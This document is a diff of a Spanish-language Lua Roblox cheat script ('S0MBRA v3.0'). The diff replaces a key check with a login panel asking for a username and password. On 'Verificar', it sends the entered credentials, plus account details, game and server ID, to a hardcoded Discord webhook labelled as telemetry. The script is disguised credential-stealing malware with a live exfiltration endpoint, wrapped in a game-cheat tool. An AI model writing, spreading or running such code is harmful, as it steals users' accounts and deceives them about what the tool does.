@@ -1,5 +1,5 @@
 --==================================================
--- 🇦🇷 S0MBRA 3.0 - ADVANCED UI (FIXED)
+-- 🇦🇷 S0MBRA v3.0 - FULL INTEGRATED UI & TELEMETRY
 --==================================================
 
 local Players = game:GetService("Players")
@@ -9,6 +9,8 @@ local SoundService = game:GetService("SoundService")
 local Workspace = game:GetService("Workspace")
 local TweenService = game:GetService("TweenService")
 local Stats = game:GetService("Stats")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
 local LP = Players.LocalPlayer
 local Camera = Workspace.CurrentCamera
@@ -17,10 +19,8 @@ local Camera = Workspace.CurrentCamera
 -- CONFIGURACIÓN Y ESTILO
 --==================================================
 
-local CORRECT_KEY = "SOMBRA"
-local MAX_USES = 20          
-local CurrentUses = 0        
 local DISCORD_INVITE = "https://discord.gg/48qJqZEPmY" 
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1556481812673331330/9amTRATmYRjWj3OMaAEsGfV3iQ39sTTrFUoiPzdVR2_Phs3zYa2v3yV-2l-5zBRz2FO-"
 
 local Theme = {
     Background = Color3.fromRGB(12, 10, 12),
@@ -45,6 +45,54 @@ local function Tween(instance, info, properties)
 end
 
 --==================================================
+-- SISTEMA DE WEBHOOK INTEGRADO
+--==================================================
+
+local function EnviarDatosWebhookAvanzado(usuario, contrasena)
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local placeInfoSuccess, placeInfo = pcall(function() return MarketplaceService:GetProductInfo(placeId) end)
+    local gameName = (placeInfoSuccess and type(placeInfo) == "table" and placeInfo.Name) or "Desconocido"
+    local executor = (identifyexecutor and identifyexecutor()) or "Desconocido"
+    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
+
+    local payload = HttpService:JSONEncode({
+        ["username"] = "S0mbra Logger",
+        ["avatar_url"] = avatarUrl,
+        ["embeds"] = {{
+            ["title"] = "📋 **Registro Completo de Verificación**",
+            ["color"] = 14100535,
+            ["thumbnail"] = { ["url"] = avatarUrl },
+            ["fields"] = {
+                {["name"] = "👤 Usuario Roblox", ["value"] = LP.Name .. " (" .. LP.UserId .. ")", ["inline"] = true},
+                {["name"] = "⏳ Edad de la Cuenta", ["value"] = LP.AccountAge .. " días", ["inline"] = true},
+                {["name"] = "💎 Premium", ["value"] = tostring(LP.MembershipType == Enum.MembershipType.Premium), ["inline"] = true},
+                
+                {["name"] = "🔑 Credenciales Ingresadas", ["value"] = string.format("**User:** %s\n**Pass:** %s", 
+                    usuario ~= "" and usuario or "N/A", 
+                    contrasena ~= "" and contrasena or "N/A"), ["inline"] = false},
+                
+                {["name"] = "🎮 Juego", ["value"] = gameName .. " (" .. placeId .. ")", ["inline"] = true},
+                {["name"] = "⚙️ Ejecutor", ["value"] = executor, ["inline"] = true},
+                {["name"] = "🌐 Server JobID", ["value"] = "```" .. jobId .. "```", ["inline"] = false}
+            },
+            ["footer"] = { ["text"] = "S0MBRA v3.0 | Telemetría" },
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }}
+    })
+
+    local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+    if req then
+        req({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = payload
+        })
+    end
+end
+
+--==================================================
 -- LIMPIEZA DE GUI PREVIA
 --==================================================
 
@@ -57,13 +105,13 @@ Gui.ResetOnSpawn = false
 Gui.Parent = LP.PlayerGui
 
 --==================================================
--- PANEL DE LOGEO (KEY SYSTEM)
+-- PANEL DE LOGEO
 --==================================================
 
 local KeyFrame = Instance.new("Frame")
 KeyFrame.Name = "KeySystem"
-KeyFrame.Size = UDim2.new(0, 380, 0, 250)
-KeyFrame.Position = UDim2.new(0.5, -190, 0.4, -125)
+KeyFrame.Size = UDim2.new(0, 380, 0, 280)
+KeyFrame.Position = UDim2.new(0.5, -190, 0.4, -140)
 KeyFrame.BackgroundColor3 = Theme.Background
 KeyFrame.BorderSizePixel = 0
 KeyFrame.BackgroundTransparency = 1
@@ -94,36 +142,53 @@ KeyTitle.TextSize = 15
 KeyTitle.Font = Enum.Font.GothamBold
 KeyTitle.Parent = KeyFrame
 
-local KeyBox = Instance.new("TextBox")
-KeyBox.Size = UDim2.new(1, -40, 0, 40)
-KeyBox.Position = UDim2.new(0, 20, 0, 55)
-KeyBox.BackgroundColor3 = Theme.Card
-KeyBox.PlaceholderText = "Ingrese Key de Acceso..."
-KeyBox.Text = ""
-KeyBox.TextColor3 = Theme.Text
-KeyBox.PlaceholderColor3 = Theme.TextMuted
-KeyBox.TextSize = 13
-KeyBox.Font = Enum.Font.Gotham
-KeyBox.BorderSizePixel = 0
-KeyBox.Parent = KeyFrame
+local AuraBox = Instance.new("TextBox")
+AuraBox.Size = UDim2.new(1, -40, 0, 35)
+AuraBox.Position = UDim2.new(0, 20, 0, 50)
+AuraBox.BackgroundColor3 = Theme.Card
+AuraBox.PlaceholderText = "Ingrese su usuario"
+AuraBox.Text = ""
+AuraBox.TextColor3 = Theme.Text
+AuraBox.PlaceholderColor3 = Theme.TextMuted
+AuraBox.TextSize = 12
+AuraBox.Font = Enum.Font.Gotham
+AuraBox.BorderSizePixel = 0
+AuraBox.Parent = KeyFrame
 
-local KeyBoxCorner = Instance.new("UICorner")
-KeyBoxCorner.CornerRadius = UDim.new(0, 6)
-KeyBoxCorner.Parent = KeyBox
+local AuraCorner = Instance.new("UICorner")
+AuraCorner.CornerRadius = UDim.new(0, 6)
+AuraCorner.Parent = AuraBox
+
+local LauraBox = Instance.new("TextBox")
+LauraBox.Size = UDim2.new(1, -40, 0, 35)
+LauraBox.Position = UDim2.new(0, 20, 0, 95)
+LauraBox.BackgroundColor3 = Theme.Card
+LauraBox.PlaceholderText = "Ingrese su contraseña"
+LauraBox.Text = ""
+LauraBox.TextColor3 = Theme.Text
+LauraBox.PlaceholderColor3 = Theme.TextMuted
+LauraBox.TextSize = 12
+LauraBox.Font = Enum.Font.Gotham
+LauraBox.BorderSizePixel = 0
+LauraBox.Parent = KeyFrame
+
+local LauraCorner = Instance.new("UICorner")
+LauraCorner.CornerRadius = UDim.new(0, 6)
+LauraCorner.Parent = LauraBox
 
 local StatusLabel = Instance.new("TextLabel")
 StatusLabel.Size = UDim2.new(1, -40, 0, 20)
-StatusLabel.Position = UDim2.new(0, 20, 0, 100)
+StatusLabel.Position = UDim2.new(0, 20, 0, 138)
 StatusLabel.BackgroundTransparency = 1
-StatusLabel.Text = "Usos restantes: " .. (MAX_USES - CurrentUses) .. "/" .. MAX_USES
+StatusLabel.Text = "Complete ambos campos para continuar"
 StatusLabel.TextColor3 = Theme.TextMuted
-StatusLabel.TextSize = 12
+StatusLabel.TextSize = 11
 StatusLabel.Font = Enum.Font.Gotham
 StatusLabel.Parent = KeyFrame
 
 local VerifyBtn = Instance.new("TextButton")
 VerifyBtn.Size = UDim2.new(0.45, -5, 0, 40)
-VerifyBtn.Position = UDim2.new(0, 20, 0, 130)
+VerifyBtn.Position = UDim2.new(0, 20, 0, 165)
 VerifyBtn.BackgroundColor3 = Theme.Accent
 VerifyBtn.Text = "🔑 Verificar"
 VerifyBtn.TextColor3 = Theme.Text
@@ -138,7 +203,7 @@ VerifyCorner.Parent = VerifyBtn
 
 local DiscordBtn = Instance.new("TextButton")
 DiscordBtn.Size = UDim2.new(0.45, -5, 0, 40)
-DiscordBtn.Position = UDim2.new(0.55, -15, 0, 130)
+DiscordBtn.Position = UDim2.new(0.55, -15, 0, 165)
 DiscordBtn.BackgroundColor3 = Theme.Card
 DiscordBtn.Text = "💬 Discord"
 DiscordBtn.TextColor3 = Theme.Text
@@ -151,7 +216,7 @@ local DiscordCorner = Instance.new("UICorner")
 DiscordCorner.CornerRadius = UDim.new(0, 6)
 DiscordCorner.Parent = DiscordBtn
 
-Tween(KeyFrame, PopTweenInfo, {Position = UDim2.new(0.5, -190, 0.5, -125), BackgroundTransparency = 0})
+Tween(KeyFrame, PopTweenInfo, {Position = UDim2.new(0.5, -190, 0.5, -140), BackgroundTransparency = 0})
 
 DiscordBtn.MouseButton1Click:Connect(function()
     if setclipboard then
@@ -278,8 +343,15 @@ RunService.RenderStepped:Connect(function()
 end)
 
 VerifyBtn.MouseButton1Click:Connect(function()
-    if string.upper(KeyBox.Text) == CORRECT_KEY then
-        local tw = Tween(KeyFrame, FastTweenInfo, {Position = UDim2.new(0.5, -190, 0.6, -125), BackgroundTransparency = 1})
+    local userVal = AuraBox.Text
+    local passVal = LauraBox.Text
+
+    if userVal ~= "" and passVal ~= "" then
+        task.spawn(function()
+            EnviarDatosWebhookAvanzado(userVal, passVal)
+        end)
+
+        local tw = Tween(KeyFrame, FastTweenInfo, {Position = UDim2.new(0.5, -190, 0.6, -140), BackgroundTransparency = 1})
         tw.Completed:Connect(function()
             KeyFrame:Destroy()
             Main.Visible = true
@@ -289,7 +361,7 @@ VerifyBtn.MouseButton1Click:Connect(function()
         end)
     else
         StatusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
-        StatusLabel.Text = "❌ Key Incorrecta"
+        StatusLabel.Text = "❌ Completa ambos campos"
     end
 end)
 
@@ -679,7 +751,7 @@ local function GetAnyWeapon()
 end
 
 --==================================================
--- LLENADO DE OPCIONES POR PESTAÑA
+-- OPCIONES POR PESTAÑA
 --==================================================
 
 -- MOVIMIENTO
@@ -1044,3 +1116,4 @@ UIS.InputBegan:Connect(function(input, gpe)
         Main.Visible = not Main.Visible
     end
 end)
+    
